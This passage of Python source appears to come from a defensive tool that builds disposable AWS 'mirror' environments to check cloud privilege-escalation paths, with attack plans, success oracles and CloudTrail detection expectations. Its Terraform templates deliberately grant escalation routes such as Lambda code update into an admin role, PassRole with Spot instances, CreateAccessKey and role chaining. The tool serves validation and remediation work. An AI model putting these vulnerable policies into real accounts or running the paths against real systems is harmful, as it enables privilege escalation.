            "No source artifact is downloaded during prepare.",
            "approved-copy requires a separate command and exact approval token.",
            "Secrets and customer data require sanitization before target deployment.",
            "KMS key material is never copied.",
        ],
    }


def attack_plan_for(
    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
) -> dict[str, Any]:
    catalog = official_edge_catalog()
    selected = [
        edge
        for edge in edges
        if edge.start in scenario.node_ids
        and edge.end in scenario.node_ids
        and (
            edge.kind not in STRUCTURAL_EDGE_KINDS
            or edge.kind in PATH_CONNECTOR_EDGE_KINDS
        )
    ]
    return {
        "scenario_id": scenario.scenario_id,
        "scenario_type": scenario.scenario_type,
        "execution_adapter": (
            "AUTOMATED_BOUNDED"
            if scenario.scenario_type != "generic_awshound_path"
            else "SCHEMA_DERIVED_REVIEW_REQUIRED"
        ),
        "steps": [
            {
                "edge": edge.kind,
                "source_node": edge.start,
                "target_node": edge.end,
                "actions": catalog.get(edge.kind, {}).get("actions", []),
                "description": catalog.get(edge.kind, {}).get("description", ""),
                "official_exploitation_metadata": catalog.get(edge.kind, {}).get("metadata", {}).get("exploitation"),
                "conditions": edge.properties.get("conditions", ""),
                "trust_policy_conditions": edge.properties.get("trust_policy_conditions", ""),
            }
            for edge in selected
        ],
        "safety": "Generic steps are not executed automatically until a bounded adapter is implemented.",
    }


EXECUTOR_FAMILY_BY_SERVICE = {
    "iam": "IAMExecutor",
    "sts": "STSExecutor",
    "lambda": "LambdaExecutor",
    "ec2": "EC2Executor",
    "ssm": "SSMExecutor",
    "s3": "S3Executor",
    "kms": "KMSExecutor",
    "cloudformation": "CloudFormationExecutor",
    "eks": "EKSExecutor",
    "organizations": "OrganizationsExecutor",
}


def success_oracle_for_action(action: str, target_kind: str) -> str:
    service, _, operation = action.partition(":")
    lower = operation.lower()
    if service == "sts" and "assumerole" in lower:
        return "CALLER_ARN_MATCH"
    if service == "s3" and lower in {"getobject", "putobject"}:
        return "S3_CANARY_HASH_MATCH"
    if service == "ssm" and lower == "getparameter":
        return "SSM_CANARY_HASH_MATCH"
    if service == "lambda" and lower in {"invoke", "invokefunction"}:
        return "LAMBDA_RESPONSE_AND_ROLE_CANARY"
    if service == "ec2" and lower in {"runinstances", "requestspotinstances"}:
        return "INSTANCE_ROLE_CANARY"
    if service == "ssm" and lower in {"sendcommand", "startsession"}:
        return "SSM_COMMAND_OR_SESSION_CANARY"
    if service == "kms" and lower in {"decrypt", "generatedatakey"}:
        return "KMS_PLAINTEXT_HASH_MATCH"
    if service == "eks":
        return "EKS_POD_CALLER_IDENTITY"
    if service in {"iam", "organizations"}:
        return "AUTHORIZATION_STATE_DELTA"
    if target_kind == "AWS_Role":
        return "TARGET_ROLE_STATE_AND_CALLER_IDENTITY"
    return "API_RESPONSE_AND_RESOURCE_STATE"


def validation_contract_for(
    scenario: Scenario, nodes: dict[str, Node], edges: list[Edge]
) -> dict[str, Any]:
    catalog = official_edge_catalog()
    selected = [
        edge
        for edge in edges
        if edge.start in scenario.node_ids
        and edge.end in scenario.node_ids
        and (
            edge.kind not in STRUCTURAL_EDGE_KINDS
            or edge.kind in PATH_CONNECTOR_EDGE_KINDS
        )
    ]
    implemented = scenario.scenario_type != "generic_awshound_path"
    steps: list[dict[str, Any]] = []
    missing: list[str] = []
    for index, edge in enumerate(selected, start=1):
        actions = list(catalog.get(edge.kind, {}).get("actions", []))
        action_steps = []
        if not actions and edge.kind not in PATH_CONNECTOR_EDGE_KINDS:
            missing.append(f"ACTION_MAPPING:{edge.kind}")
        for action in actions:
            service = action.split(":", 1)[0]
            executor = EXECUTOR_FAMILY_BY_SERVICE.get(service)
            if not executor:
                missing.append(f"EXECUTOR_FAMILY:{action}")
            action_steps.append(
                {
                    "action": action,
                    "executor_family": executor or "UNREGISTERED",
                    "source_binding": "execution_context.current_principal",
                    "target_binding": edge.end,
                    "success_oracle": success_oracle_for_action(
                        action, nodes[edge.end].primary_kind
                    ),
                }
            )
        steps.append(
            {
                "step": index,
                "edge": edge.kind,
                "source_node": edge.start,
                "target_node": edge.end,
                "actions": action_steps,
                "conditions": edge.properties.get("conditions", ""),
                "trust_policy_conditions": edge.properties.get(
                    "trust_policy_conditions", ""
                ),
                "credential_transition": (
                    "REPLACE_CURRENT_PRINCIPAL"
                    if edge.kind
                    in {
                        "AWS_CanAssumeRole",
                        "AWS_CanAssumeRoleWithSAML",
                        "AWS_CanAssumeRoleWithWebIdentity",
                        "AWS_CanAssumeRoleViaIRSA",
                        "AWS_CanAssumeRoleViaPodIdentity",
                        "AWS_RunsAs",
                    }
                    else "KEEP_CURRENT_PRINCIPAL"
                ),
            }
        )
    if not implemented:
        missing.append("BOUNDED_RUNTIME_ADAPTER:generic_awshound_path")
    edge_kinds = {edge.kind for edge in selected}
    if (
        "AWS_CanUpdateLambdaCode" in edge_kinds
        and "AWS_CanInvokeLambdaFunction" not in edge_kinds
    ):
        missing.append("LAMBDA_TRIGGER_OR_INVOKE_REQUIRED")
    return {
        "contract_version": "1.0",
        "scenario_id": scenario.scenario_id,
        "scenario_type": scenario.scenario_type,
        "required_terminal_state": "EXECUTION_VERIFIED",
        "automation_status": (
            "AUTO_EXECUTABLE"
            if implemented and not missing
            else "EXECUTOR_IMPLEMENTATION_REQUIRED"
        ),
        "starting_principal": scenario.start_node_id,
        "negative_precheck": {
            "required": True,
            "rule": "The starting principal must not already satisfy the final success oracle.",
        },
        "readiness_checks": [
            "Terraform state and required outputs exist",
            "Starting-principal ARN matches the execution credential",
            "Required workload resources are Active/Running",
            "Required artifacts and canaries exist",
            "IAM and resource-policy propagation is complete",
        ],
        "steps": steps,
        "final_proof": {
            "required": True,
            "rules": [
                "Every required edge action succeeded in order",
                "Credential transitions match expected target principals",
                "The final canary or authorization-state oracle passed",
                "No deployer/administrator credential was used for an attack step",
            ],
        },
        "missing_automation": sorted(set(missing)),
        "result_states": [
            "EXECUTION_VERIFIED",
            "ATTACK_BLOCKED",
            "MIRROR_ERROR",
            "ENVIRONMENT_ERROR",
            "EXECUTOR_IMPLEMENTATION_REQUIRED",
        ],
    }


def detection_expectations_for(scenario: Scenario) -> dict[str, Any]:
    mapping = {
        "lambda_update_invoke_admin": {
            "management_events": ["UpdateFunctionCode"],
            "data_events": ["Invoke"],
        },
        "sts_assume_admin": {"management_events": ["AssumeRole"], "data_events": []},
        "ec2_passrole_spot_admin": {
            "management_events": ["RequestSpotInstances"],
            "data_events": [],
        },
        "iam_create_access_key_s3": {
            "management_events": ["CreateAccessKey"],
            "data_events": ["GetObject"],
        },
        "role_chain_s3": {"management_events": ["AssumeRole"], "data_events": ["GetObject"]},
    }
    result = mapping.get(scenario.scenario_type, {"management_events": [], "data_events": []})
    return {
        **result,
        "siem": "Connector-specific. The tool emits an evidence contract but does not invent a SIEM query.",
    }


TF_HEADER = r'''terraform {
  required_version = ">= 1.6.0"

  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.0"
    }
    archive = {
      source  = "hashicorp/archive"
      version = "~> 2.7"
    }
  }
}

provider "aws" {
  region = var.aws_region

  default_tags {
    tags = {
      ManagedBy = "awshound-mirror"
      Scenario  = "@@SCENARIO_ID@@"
      RunId     = var.resource_name_prefix
    }
  }
}

data "aws_caller_identity" "current" {}

locals {
  prefix = substr("${var.resource_name_prefix}-@@SCENARIO_ID@@", 0, 48)
}
'''


COMMON_VARIABLES = r'''variable "aws_region" {
  description = "Mirror deployment Region"
  type        = string
  default     = "@@REGION@@"
}

variable "resource_name_prefix" {
  description = "Required unique prefix for disposable mirror resources"
  type        = string

  validation {
    condition     = can(regex("^[a-z0-9][a-z0-9-]{2,23}$", var.resource_name_prefix))
    error_message = "Use 3-24 lowercase letters, digits, or hyphens."
  }
}

variable "synthetic_flag" {
  description = "Non-production canary value; never use a source secret"
  type        = string
  sensitive   = true
}

variable "enable_vulnerable_path" {
  description = "True for initial exploit validation; false for remediation and retest"
  type        = bool
  default     = true
}
'''


COMMON_OUTPUTS = r'''output "mirror_account_id" {
  value = data.aws_caller_identity.current.account_id
}

output "scenario_id" {
  value = "@@SCENARIO_ID@@"
}

output "starting_user_name" {
  value = aws_iam_user.starting.name
}

output "starting_access_key_id" {
  value     = aws_iam_access_key.starting.id
  sensitive = true
}

output "starting_secret_access_key" {
  value     = aws_iam_access_key.starting.secret
  sensitive = true
}
'''


INITIAL_LAMBDA = '''def lambda_handler(event, context):
    return {"statusCode": 200, "body": "mirror-initial-code"}
'''


def cloudtrail_resources(data_resources: list[tuple[str, str]]) -> str:
    blocks = ""
    for resource_type, values_expression in data_resources:
        blocks += f'''
    data_resource {{
      type   = "{resource_type}"
      values = {values_expression}
    }}
'''
    return r'''
resource "aws_s3_bucket" "cloudtrail" {
  bucket        = lower(substr("${local.prefix}-trail-${data.aws_caller_identity.current.account_id}", 0, 63))
  force_destroy = true
}

data "aws_iam_policy_document" "cloudtrail" {
  statement {
    sid       = "AWSCloudTrailAclCheck"
    effect    = "Allow"
    actions   = ["s3:GetBucketAcl"]
    resources = [aws_s3_bucket.cloudtrail.arn]
    principals {
      type        = "Service"
      identifiers = ["cloudtrail.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"
      variable = "AWS:SourceArn"
      values   = ["arn:aws:cloudtrail:${var.aws_region}:${data.aws_caller_identity.current.account_id}:trail/${local.prefix}-trail"]
    }
  }

  statement {
    sid       = "AWSCloudTrailWrite"
    effect    = "Allow"
    actions   = ["s3:PutObject"]
    resources = ["${aws_s3_bucket.cloudtrail.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*"]
    principals {
      type        = "Service"
      identifiers = ["cloudtrail.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"
      variable = "s3:x-amz-acl"
      values   = ["bucket-owner-full-control"]
    }
    condition {
      test     = "StringEquals"
      variable = "AWS:SourceArn"
      values   = ["arn:aws:cloudtrail:${var.aws_region}:${data.aws_caller_identity.current.account_id}:trail/${local.prefix}-trail"]
    }
  }
}

resource "aws_s3_bucket_policy" "cloudtrail" {
  bucket = aws_s3_bucket.cloudtrail.id
  policy = data.aws_iam_policy_document.cloudtrail.json
}

resource "aws_cloudtrail" "mirror" {
  name                          = "${local.prefix}-trail"
  s3_bucket_name                = aws_s3_bucket.cloudtrail.id
  include_global_service_events = true
  is_multi_region_trail         = false
  enable_logging                = true
  enable_log_file_validation    = true

  event_selector {
    read_write_type           = "All"
    include_management_events = true
@@DATA_RESOURCES@@
  }

  depends_on = [aws_s3_bucket_policy.cloudtrail]
}
'''.replace("@@DATA_RESOURCES@@", blocks.rstrip())


CLOUDTRAIL_OUTPUTS = r'''
output "cloudtrail_name" {
  value = aws_cloudtrail.mirror.name
}

output "cloudtrail_bucket_name" {
  value = aws_s3_bucket.cloudtrail.id
}
'''


def tf_replace(text: str, scenario: Scenario) -> str:
    return text.replace("@@SCENARIO_ID@@", scenario.scenario_id).replace(
        "@@REGION@@", scenario.region
    )


def lambda_terraform(scenario: Scenario, nodes: dict[str, Node]) -> dict[str, str]:
    function = nodes[scenario.target_node_id]
    runtime = str(function.properties.get("runtime") or "python3.11")
    handler = str(function.properties.get("handler") or "lambda_function.lambda_handler")
    memory = int(function.properties.get("memory_size") or 128)
    timeout = int(function.properties.get("timeout") or 10)
    main = TF_HEADER + rf'''
resource "aws_iam_user" "starting" {{
  name          = "${{local.prefix}}-starting-user"
  force_destroy = true
}}

resource "aws_iam_access_key" "starting" {{
  user = aws_iam_user.starting.name
}}

resource "aws_iam_user_policy" "starting" {{
  name = "${{local.prefix}}-starting-policy"
  user = aws_iam_user.starting.name

  policy = jsonencode({{
    Version = "2012-10-17"
    Statement = concat(
      [{{
        Sid      = "MirrorRecon"
        Effect   = "Allow"
        Action   = ["lambda:GetFunction", "lambda:ListFunctions", "iam:GetRole", "sts:GetCallerIdentity"]
        Resource = "*"
      }}],
      var.enable_vulnerable_path ? [{{
        Sid      = "MirrorUpdateAndInvoke"
        Effect   = "Allow"
        Action   = ["lambda:UpdateFunctionCode", "lambda:InvokeFunction"]
        Resource = aws_lambda_function.target.arn
      }}] : []
    )
  }})
}}

resource "aws_iam_role" "target" {{
  name = "${{local.prefix}}-target-role"
  assume_role_policy = jsonencode({{
    Version = "2012-10-17"
    Statement = [{{
      Effect    = "Allow"
      Principal = {{ Service = "lambda.amazonaws.com" }}
      Action    = "sts:AssumeRole"
    }}]
  }})
}}

resource "aws_iam_role_policy_attachment" "target_admin" {{
  role       = aws_iam_role.target.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}}

resource "aws_ssm_parameter" "flag" {{
  name  = "/mirror/${{var.resource_name_prefix}}/{scenario.scenario_id}/flag"
  type  = "String"
  value = var.synthetic_flag
}}

data "archive_file" "initial" {{
  type        = "zip"
  source_file = "${{path.module}}/fixtures/lambda_function.py"
  output_path = "${{path.module}}/initial-lambda.zip"
}}

resource "aws_lambda_function" "target" {{
  function_name    = "${{local.prefix}}-target-lambda"
  role             = aws_iam_role.target.arn
  runtime          = "{runtime}"
  handler          = "{handler}"
  memory_size      = {memory}
  timeout          = {timeout}
  filename         = data.archive_file.initial.output_path
  source_code_hash = data.archive_file.initial.output_base64sha256

  environment {{
    variables = {{
      MIRROR_FLAG_PARAMETER = aws_ssm_parameter.flag.name
    }}
  }}

  depends_on = [aws_iam_role_policy_attachment.target_admin]
}}
''' + cloudtrail_resources([("AWS::Lambda::Function", "[aws_lambda_function.target.arn]")])
    outputs = COMMON_OUTPUTS + r'''
output "target_lambda_name" {
  value = aws_lambda_function.target.function_name
}

output "target_lambda_arn" {
  value = aws_lambda_function.target.arn
}

output "target_role_arn" {
  value = aws_iam_role.target.arn
}

output "flag_parameter_name" {
  value = aws_ssm_parameter.flag.name
}

output "synthetic_flag_sha256" {
  value     = sha256(var.synthetic_flag)
  sensitive = true
}
''' + CLOUDTRAIL_OUTPUTS
    return {
        "main.tf": tf_replace(main, scenario),
        "variables.tf": tf_replace(COMMON_VARIABLES, scenario),
        "outputs.tf": tf_replace(outputs, scenario),
        "fixtures/lambda_function.py": INITIAL_LAMBDA,
    }


def sts_terraform(scenario: Scenario) -> dict[str, str]:
    main = TF_HEADER + r'''
resource "aws_iam_user" "starting" {
  name          = "${local.prefix}-starting-user"
  force_destroy = true
}

resource "aws_iam_access_key" "starting" {
  user = aws_iam_user.starting.name
}

resource "aws_iam_role" "remediation_sink" {
  name = "${local.prefix}-remediation-sink"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "lambda.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role" "target" {
  name                 = "${local.prefix}-target-role"
  max_session_duration = 3600
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        AWS = var.enable_vulnerable_path ? aws_iam_user.starting.arn : aws_iam_role.remediation_sink.arn
      }
      Action = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy_attachment" "target_admin" {
  role       = aws_iam_role.target.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_iam_user_policy" "starting" {
  name = "${local.prefix}-starting-policy"
  user = aws_iam_user.starting.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = concat(
      [{
        Sid      = "MirrorRecon"
        Effect   = "Allow"
        Action   = ["sts:GetCallerIdentity", "iam:GetRole"]
        Resource = "*"
      }],
      var.enable_vulnerable_path ? [{
        Sid      = "MirrorAssumeTarget"
        Effect   = "Allow"
        Action   = ["sts:AssumeRole"]
        Resource = aws_iam_role.target.arn
      }] : []
    )
  })
}

resource "aws_ssm_parameter" "flag" {
  name  = "/mirror/${var.resource_name_prefix}/@@SCENARIO_ID@@/flag"
  type  = "String"
  value = var.synthetic_flag
}
''' + cloudtrail_resources([])
    outputs = COMMON_OUTPUTS + r'''
output "target_role_arn" {
  value = aws_iam_role.target.arn
}

output "flag_parameter_name" {
  value = aws_ssm_parameter.flag.name
}

output "synthetic_flag_sha256" {
  value     = sha256(var.synthetic_flag)
  sensitive = true
}
''' + CLOUDTRAIL_OUTPUTS
    return {
        "main.tf": tf_replace(main, scenario),
        "variables.tf": tf_replace(COMMON_VARIABLES, scenario),
        "outputs.tf": tf_replace(outputs, scenario),
    }


def s3_base_resources() -> str:
    return r'''
resource "aws_s3_bucket" "target" {
  bucket        = lower(substr("${local.prefix}-${data.aws_caller_identity.current.account_id}", 0, 63))
  force_destroy = true
}

resource "aws_s3_bucket_public_access_block" "target" {
  bucket                  = aws_s3_bucket.target.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_ownership_controls" "target" {
  bucket = aws_s3_bucket.target.id
  rule {
    object_ownership = "BucketOwnerEnforced"
  }
}

resource "aws_s3_object" "flag" {
  bucket       = aws_s3_bucket.target.id
  key          = "flag.txt"
  content      = var.synthetic_flag
  content_type = "text/plain"
}
'''


def s3_outputs() -> str:
    return r'''
output "target_bucket_name" {
  value = aws_s3_bucket.target.id
}

output "target_object_key" {
  value = aws_s3_object.flag.key
}

output "synthetic_flag_sha256" {
  value     = sha256(var.synthetic_flag)
  sensitive = true
}
'''


def create_key_terraform(scenario: Scenario) -> dict[str, str]:
    main = TF_HEADER + r'''
resource "aws_iam_user" "starting" {
  name          = "${local.prefix}-privesc-user"
  force_destroy = true
}

resource "aws_iam_access_key" "starting" {
  user = aws_iam_user.starting.name
}

resource "aws_iam_user" "access_target" {
  name          = "${local.prefix}-bucket-access-user"
  force_destroy = true
}
''' + s3_base_resources() + r'''
resource "aws_iam_user_policy" "access_target" {
  name = "${local.prefix}-bucket-access-policy"
  user = aws_iam_user.access_target.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:ListBucket", "s3:GetObject"]
      Resource = [aws_s3_bucket.target.arn, "${aws_s3_bucket.target.arn}/*"]
    }]
  })
}

resource "aws_iam_user_policy" "starting" {
  name = "${local.prefix}-create-key-policy"
  user = aws_iam_user.starting.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = concat(
      [{
        Effect   = "Allow"
        Action   = ["sts:GetCallerIdentity", "iam:GetUser", "iam:ListAccessKeys"]
        Resource = "*"
      }],
      var.enable_vulnerable_path ? [{
        Effect   = "Allow"
        Action   = ["iam:CreateAccessKey"]
        Resource = aws_iam_user.access_target.arn
      }] : []
    )
  })
}
''' + cloudtrail_resources([("AWS::S3::Object", '["${aws_s3_bucket.target.arn}/"]')])
    outputs = COMMON_OUTPUTS + r'''
output "access_target_user_name" {
  value = aws_iam_user.access_target.name
}
''' + s3_outputs() + CLOUDTRAIL_OUTPUTS
    return {
        "main.tf": tf_replace(main, scenario),
        "variables.tf": tf_replace(COMMON_VARIABLES, scenario),
        "outputs.tf": tf_replace(outputs, scenario),
    }


def role_chain_terraform(scenario: Scenario) -> dict[str, str]:
    main = TF_HEADER + r'''
resource "aws_iam_user" "starting" {
  name          = "${local.prefix}-starting-user"
  force_destroy = true
}

resource "aws_iam_access_key" "starting" {
  user = aws_iam_user.starting.name
}

resource "aws_iam_role" "remediation_sink" {
  name = "${local.prefix}-remediation-sink"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "lambda.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role" "initial" {
  name = "${local.prefix}-initial-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        AWS = var.enable_vulnerable_path ? aws_iam_user.starting.arn : aws_iam_role.remediation_sink.arn
      }
      Action = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role" "intermediate" {
  name = "${local.prefix}-intermediate-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { AWS = aws_iam_role.initial.arn }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role" "s3_access" {
  name = "${local.prefix}-s3-access-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { AWS = aws_iam_role.intermediate.arn }
      Action    = "sts:AssumeRole"
    }]
  })
}
''' + s3_base_resources() + r'''
resource "aws_iam_user_policy" "starting" {
  name = "${local.prefix}-starting-policy"
  user = aws_iam_user.starting.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = concat(
      [{
        Effect   = "Allow"
        Action   = "sts:GetCallerIdentity"
        Resource = "*"
      }],
      var.enable_vulnerable_path ? [{
        Effect   = "Allow"
        Action   = ["sts:AssumeRole"]
        Resource = aws_iam_role.initial.arn
      }] : []
    )
  })
}

resource "aws_iam_role_policy" "initial" {
  name = "${local.prefix}-assume-intermediate"
  role = aws_iam_role.initial.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "sts:AssumeRole"
      Resource = aws_iam_role.intermediate.arn
    }]
  })
}

resource "aws_iam_role_policy" "intermediate" {
  name = "${local.prefix}-assume-s3"
  role = aws_iam_role.intermediate.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "sts:AssumeRole"
      Resource = aws_iam_role.s3_access.arn
    }]
  })
}

resource "aws_iam_role_policy" "s3_access" {
  name = "${local.prefix}-s3-access"
  role = aws_iam_role.s3_access.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:ListBucket", "s3:GetObject"]
      Resource = [aws_s3_bucket.target.arn, "${aws_s3_bucket.target.arn}/*"]
    }]
  })
}
''' + cloudtrail_resources([("AWS::S3::Object", '["${aws_s3_bucket.target.arn}/"]')])
    outputs = COMMON_OUTPUTS + r'''
output "initial_role_arn" {
  value = aws_iam_role.initial.arn
}

output "intermediate_role_arn" {
  value = aws_iam_role.intermediate.arn
}

output "s3_access_role_arn" {
  value = aws_iam_role.s3_access.arn
}
''' + s3_outputs() + CLOUDTRAIL_OUTPUTS
    return {
        "main.tf": tf_replace(main, scenario),
        "variables.tf": tf_replace(COMMON_VARIABLES, scenario),
        "outputs.tf": tf_replace(outputs, scenario),
    }


EC2_VARIABLES = COMMON_VARIABLES + r'''

variable "mirror_ami_id" {
  description = "Explicit AMI for the disposable Spot instance; not present in paths that create a new instance"
  type        = string

  validation {
    condition     = can(regex("^ami-[0-9a-fA-F]+$", var.mirror_ami_id))
    error_message = "Provide a valid AMI ID for the target Region."
  }
}

variable "mirror_instance_type" {
  description = "Disposable Spot instance type"
  type        = string
  default     = "t3.micro"
}
'''


def ec2_terraform(scenario: Scenario) -> dict[str, str]:
    main = TF_HEADER + r'''
resource "aws_iam_user" "starting" {
  name          = "${local.prefix}-starting-user"
  force_destroy = true
}

resource "aws_iam_access_key" "starting" {
  user = aws_iam_user.starting.name
}

resource "aws_iam_role" "target" {
  name = "${local.prefix}-target-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy_attachment" "target_admin" {
  role       = aws_iam_role.target.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

resource "aws_iam_instance_profile" "target" {
  name = "${local.prefix}-instance-profile"
  role = aws_iam_role.target.name
}

resource "aws_iam_user_policy" "starting" {
  name = "${local.prefix}-starting-policy"
  user = aws_iam_user.starting.name
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = concat(
      [{
        Effect   = "Allow"
        Action   = ["sts:GetCallerIdentity", "ec2:DescribeSpotInstanceRequests", "ec2:DescribeInstances", "ec2:DescribeInstanceStatus"]
        Resource = "*"
      }],
      var.enable_vulnerable_path ? [
        {
          Effect   = "Allow"
          Action   = ["iam:PassRole"]
          Resource = aws_iam_role.target.arn
        },
        {
          Effect   = "Allow"
          Action   = ["ec2:RequestSpotInstances"]
          Resource = "*"
        }
      ] : []
    )
  })
}

resource "aws_vpc" "mirror" {
  cidr_block           = "10.77.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true
}

resource "aws_subnet" "private" {
  vpc_id                  = aws_vpc.mirror.id
  cidr_block              = "10.77.1.0/24"
  map_public_ip_on_launch = false
}

resource "aws_security_group" "spot" {
  name        = "${local.prefix}-spot"
  description = "No ingress; HTTPS only to the mirror SSM endpoint"
  vpc_id      = aws_vpc.mirror.id
}

resource "aws_security_group" "ssm_endpoint" {
  name        = "${local.prefix}-ssm-endpoint"
  description = "Accept HTTPS only from the disposable Spot instance"
  vpc_id      = aws_vpc.mirror.id
}

resource "aws_security_group_rule" "spot_to_ssm" {
  type                     = "egress"
  from_port                = 443
  to_port                  = 443
  protocol                 = "tcp"
  security_group_id        = aws_security_group.spot.id
  source_security_group_id = aws_security_group.ssm_endpoint.id
}

resource "aws_security_group_rule" "ssm_from_spot" {
  type                     = "ingress"
  from_port                = 443
  to_port                  = 443
  protocol                 = "tcp"
  security_group_id        = aws_security_group.ssm_endpoint.id
  source_security_group_id = aws_security_group.spot.id
}

resource "aws_vpc_endpoint" "ssm" {
  vpc_id              = aws_vpc.mirror.id
  service_name        = "com.amazonaws.${var.aws_region}.ssm"
  vpc_endpoint_type   = "Interface"
  private_dns_enabled = true
  subnet_ids          = [aws_subnet.private.id]
  security_group_ids  = [aws_security_group.ssm_endpoint.id]

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = "*"
      Action    = ["ssm:GetParameter", "ssm:PutParameter"]
      Resource  = "arn:aws:ssm:${var.aws_region}:${data.aws_caller_identity.current.account_id}:parameter/mirror/${var.resource_name_prefix}/@@SCENARIO_ID@@/*"
    }]
  })
}

resource "aws_ssm_parameter" "flag" {
  name  = "/mirror/${var.resource_name_prefix}/@@SCENARIO_ID@@/flag"
  type  = "String"
  value = var.synthetic_flag
}
''' + cloudtrail_resources([])
    outputs = COMMON_OUTPUTS + r'''
output "target_role_arn" {
  value = aws_iam_role.target.arn
}

output "instance_profile_arn" {
  value = aws_iam_instance_profile.target.arn
}

output "instance_profile_name" {
  value = aws_iam_instance_profile.target.name
}

output "mirror_subnet_id" {
  value = aws_subnet.private.id
}

output "mirror_security_group_id" {
  value = aws_security_group.spot.id
}

output "mirror_ami_id" {
  value = var.mirror_ami_id
}

output "mirror_instance_type" {
  value = var.mirror_instance_type
}

output "flag_parameter_name" {
  value = aws_ssm_parameter.flag.name
}

output "evidence_parameter_name" {
  value = "/mirror/${var.resource_name_prefix}/@@SCENARIO_ID@@/evidence"
}

output "synthetic_flag_sha256" {
  value     = sha256(var.synthetic_flag)
  sensitive = true
}
''' + CLOUDTRAIL_OUTPUTS
    return {
        "main.tf": tf_replace(main, scenario),
        "variables.tf": tf_replace(EC2_VARIABLES, scenario),
        "outputs.tf": tf_replace(outputs, scenario),
    }


def tf_address(node: Node) -> str:
    base = re.sub(r"[^a-z0-9_]+", "_", node_name(node).lower()).strip("_")[:32]
    digest = hashlib.sha1(node.id.encode("utf-8")).hexdigest()[:8]
    return f"{base or 'resource'}_{digest}"


def remap_policy_document(
    raw: Any,
    nodes: dict[str, Node],
    references: dict[str, str],
    source_account_id: str,
) -> str:
    document = parse_json_property(raw, {})
    if not isinstance(document, dict) or not document:
        document = {"Version": "2012-10-17", "Statement": []}
    text = json.dumps(document, indent=2, ensure_ascii=False)
    # Longest first prevents a shorter ARN from partially replacing another.
    replacements: list[tuple[str, str]] = []
    for node_id, expression in references.items():
        arn = nodes[node_id].arn
        if arn:
            replacements.append((arn, expression))
    for source, replacement in sorted(replacements, key=lambda item: len(item[0]), reverse=True):
        text = text.replace(source, replacement)
    if re.fullmatch(r"\d{12}", source_account_id):
        text = text.replace(source_account_id, "${data.aws_caller_identity.current.account_id}")
    return text


def network_model_from_context(evidence: dict[str, Any] | None) -> dict[str, Any]:
    model: dict[str, Any] = {
        "vpcs": {},
        "vpc_attributes": {},
        "subnets": {},
        "security_groups": {},
        "security_group_rules": {},
        "route_tables": {},
        "network_acls": {},
        "internet_gateways": {},
        "nat_gateways": {},
        "vpc_endpoints": {},
    }
    if not evidence:
        return model
    for item in evidence.get("results", []):
        if item.get("status") != "COLLECTED":
            continue
        request = item.get("request", {})
        operation = request.get("operation")
        response = item.get("response", {})
        if operation == "describe-vpcs":
            model["vpcs"].update({value["VpcId"]: value for value in response.get("Vpcs", [])})
        elif operation == "describe-vpc-attribute":
            arguments = request.get("arguments", [])
            try:
                vpc_id = arguments[arguments.index("--vpc-id") + 1]
            except (ValueError, IndexError):
                continue
            attrs = model["vpc_attributes"].setdefault(vpc_id, {})
            for key in ("EnableDnsSupport", "EnableDnsHostnames"):
                if key in response:
                    attrs[key] = response[key].get("Value")
        elif operation == "describe-subnets":
            model["subnets"].update({value["SubnetId"]: value for value in response.get("Subnets", [])})
        elif operation == "describe-security-groups":
            model["security_groups"].update({value["GroupId"]: value for value in response.get("SecurityGroups", [])})
        elif operation == "describe-security-group-rules":
            model["security_group_rules"].update({value["SecurityGroupRuleId"]: value for value in response.get("SecurityGroupRules", [])})
        elif operation == "describe-route-tables":
            model["route_tables"].update({value["RouteTableId"]: value for value in response.get("RouteTables", [])})
        elif operation == "describe-network-acls":
            model["network_acls"].update({value["NetworkAclId"]: value for value in response.get("NetworkAcls", [])})
        elif operation == "describe-internet-gateways":
            model["internet_gateways"].update({value["InternetGatewayId"]: value for value in response.get("InternetGateways", [])})
        elif operation == "describe-nat-gateways":
            model["nat_gateways"].update({value["NatGatewayId"]: value for value in response.get("NatGateways", [])})
        elif operation == "describe-vpc-endpoints":
